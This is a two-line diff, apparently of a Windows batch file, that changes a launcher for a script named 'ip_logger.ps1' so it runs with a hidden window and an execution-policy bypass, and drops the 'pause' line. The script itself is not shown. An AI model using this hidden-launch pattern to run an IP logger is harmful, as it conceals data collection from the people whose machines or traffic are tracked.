@@ -1,2 +1,1 @@
-powershell -ExecutionPolicy Bypass -File ip_logger.ps1
-pause
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ip_logger.ps1
